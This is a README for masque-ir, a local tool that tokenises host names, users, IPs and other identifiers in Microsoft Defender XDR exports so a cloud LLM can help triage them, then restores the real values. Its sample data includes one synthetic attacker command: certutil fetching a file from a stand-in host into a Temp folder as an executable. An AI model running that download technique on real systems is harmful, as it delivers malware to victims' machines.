<p align="center"><img src="docs/logo.png" alt="masque-ir logo" width="200"></p>

# masque-(i)r

**Let a cloud LLM triage your Defender data without handing it your customer's
data.**

You have a Microsoft Defender XDR advanced-hunting export and want a second
opinion from Claude, ChatGPT or Copilot. The export is full of host names,
users, emails, IPs, SIDs and national IDs that must not leave the machine.

`masquer` replaces every identifier with a token on your machine, writes a
file you paste into the chat, and puts the real values back into the answer:

```
Defender export ─► masquer import/outbox ─► paste into chat ─► save answer ─► masquer restore ─► report with real values
       (local)          tokens, defang          (cloud)                            (local)
```

- **No API, no network.** You paste a text file into the chat yourself.
- **Egress gate.** Nothing is written for pasting while any known original, or any new email, IP, ID or similar match, is still in it.
- **Collapses repeats.** Identical events less than 1 h apart become one row with `FirstSeen`, `LastSeen` and `Count`, so more fits in one paste.
- **Optional name model.** A small local model (CPU only) finds person names in free text.
- **Platforms.** Linux, WSL2 and macOS; installs without sudo.

Status: early, usable. MIT licence.

## Install

```bash
# Linux, WSL2 or macOS, as your normal user
T=$(mktemp) && curl -fsSL https://raw.githubusercontent.com/kaywoz/masque-ir/main/install.sh -o "$T" && [ -s "$T" ] && bash "$T" --with-ner; rm -f "$T"
```

To check the prerequisites without changing anything, add `--check`. Offline
machines and proxies with TLS inspection: [docs/usage.md](docs/usage.md#install).

## Run

```bash
masquer case new CASE                                   # folder, mode 700
masquer import CASE DeviceProcessEvents.csv EmailEvents.csv
masquer outbox CASE                                     # writes CASE/outbox-1.md
# paste outbox-1.md into the chat, save the answer as CASE/inbox-1.md
masquer restore CASE CASE/inbox-1.md                    # writes CASE/report-1.md
```

```text
DeviceProcessEvents: 60 rows -> 48 after collapsing
EmailEvents: 60 rows -> 49 after collapsing
CASE/outbox-1.md  (77491 bytes)
Egress gate: passed. Paste the file(s) into the chat; save the answer as inbox-N.md in the case.
CASE/report-1.md: restored 4
```

To try it without real data: `masquer synth --out synth` writes fake exports
for all 66 Defender tables.

## What the data looks like

The values below come from `masquer synth`: synthetic, `.example` and `.test`
domains.

**Export** (3 of 69 columns):

| DeviceName | AccountUpn | ProcessCommandLine |
|---|---|---|
| fja-lt-0007.corp.fjallbacka-se.example | erik.johansson@fjallbacka-se.example | `certutil.exe -urlcache -f http://cdn-0114.test/dl/4cb73a80a3b4.php C:\Users\erik.johansson\AppData\Local\Temp\a.exe` |

**Outbox** (what the chat sees):

| DeviceName | AccountUpn | ProcessCommandLine |
|---|---|---|
| «HOST_0004» | «UPN_0003» | `certutil.exe -urlcache -f hxxp://«DOMAIN_0004»/dl/4cb73a80a3b4.php C:\Users\«ACCOUNT_0003»\AppData\Local\Temp\a.exe` |

Hashes, Microsoft binaries, paths and timestamps stay as they are, so the
model can still reason about them. Long encoded blobs become
`«BLOB sha256=… len=…»`.

**Answer → report:**

```text
answer:  Isolate «HOST_0004»; reset «UPN_0003». Block «DOMAIN_0004» (seen in hxxp://«DOMAIN_0004»/dl/4cb73a80a3b4.php).
report:  Isolate fja-lt-0007.corp.fjallbacka-se.example; reset erik.johansson@fjallbacka-se.example. Block cdn-0114.test (seen in hxxp://cdn-0114.test/dl/4cb73a80a3b4.php).
```

Tokens the model changed are restored and marked `⚠(was …)`. Tokens it made up
are marked `⚠ unknown token`.

## Limits

- The input is Defender advanced-hunting CSV or JSON exports. Other sources aren't supported yet.
- The tokens hide identities, not the story. The chat still sees what happened, when, and with which tools.
- Without the name model (`--with-ner`), names inside free text such as file names and subjects can slip through. `outbox` then refuses to run until you pass `--allow-without-ner` and check the file by hand.

## More

- [docs/usage.md](docs/usage.md): install options, all commands and flags, deny/allow lists, the name model, prompts.
- [docs/how-it-works.md](docs/how-it-works.md): detectors, egress gate, collapsing, restore, synthetic data.
- [PLAN.md](PLAN.md): design decisions and parked ideas.
